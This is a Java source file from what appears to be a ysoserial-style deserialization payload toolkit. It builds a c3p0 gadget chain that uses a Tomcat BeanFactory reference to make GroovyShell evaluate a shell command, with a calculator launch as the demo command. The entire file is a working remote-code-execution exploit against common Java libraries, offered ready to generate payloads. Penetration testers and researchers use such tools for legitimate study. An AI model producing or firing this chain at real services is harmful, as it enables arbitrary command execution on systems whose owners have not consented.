package com.ppp.chain.c3p0;

import com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;
import com.ppp.JavaClassHelper;
import com.ppp.ObjectPayload;
import com.ppp.annotation.Dependencies;
import com.ppp.secmgr.PayloadRunner;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.RanDomUtils;
import com.ppp.utils.Reflections;
import org.apache.naming.ResourceRef;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.naming.StringRefAddr;
import javax.sql.ConnectionPoolDataSource;
import javax.sql.PooledConnection;
import java.io.PrintWriter;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.logging.Logger;

/**
 * Groovy
 */
@Dependencies({"com.mchange:c3p0:0.9.5.2", "com.mchange:mchange-commons-java:0.2.11", "org.apache:tomcat:8.5.35", "org.codehaus.groovy:groovy:2.3.9"})
@Sink({Sink.C3P0})
public class C3P0_Groovy implements ObjectPayload<Object> {

    public static void main(String[] args) throws Exception {
//        PayloadRunner.run(C3P0.class, args);

        // rce
        SinksHelper sinksHelper = new SinksHelper();
        sinksHelper.setSink(C3P0_Groovy.class.getAnnotation(Sink.class).value()[0]);
        sinksHelper.setEnchant(EnchantType.Command);
        sinksHelper.setCommandType(EnchantEnums.Default);
        sinksHelper.setCommand("open -a Calculator.app");
        JavaClassHelper javaClassHelper = new JavaClassHelper();
        sinksHelper.setJavaClassHelper(javaClassHelper);
        PayloadRunner.run(C3P0_Groovy.class, args, sinksHelper);
    }

    public Object getObject(SinksHelper sinksHelper) throws Exception {
        // sink
        Object sinkObject = SinkScheduler.builder(sinksHelper);
        System.out.println(sinkObject);

        Object kickOffObject = getChain(sinkObject.toString());

        return kickOffObject;
    }

    public Object getChain(String script) throws Exception {
//        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
//        Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
        /**
         * Ref: https://github.com/frohoff/ysoserial/pull/184
         */
        PoolBackedDataSourceBase b = Reflections.createWithoutConstructor(PoolBackedDataSourceBase.class);
        Reflections.setFieldValue(b, "connectionPoolDataSource", new PoolSource(script));

        return b;
    }

    private static final class PoolSource implements ConnectionPoolDataSource, Referenceable {

        private String command;

        public PoolSource(String command) {
            this.command = command;
        }

        public Reference getReference() throws NamingException {
            String s = RanDomUtils.generateRandomString(3);
            ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
            ref.add(new StringRefAddr("forceString", s + "=evaluate"));

            ref.add(new StringRefAddr(s, String.format("'%s'.execute()", command)));
            return ref;
        }

        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        public void setLogWriter(PrintWriter out) throws SQLException {
        }

        public void setLoginTimeout(int seconds) throws SQLException {
        }

        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }

        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

    }
}
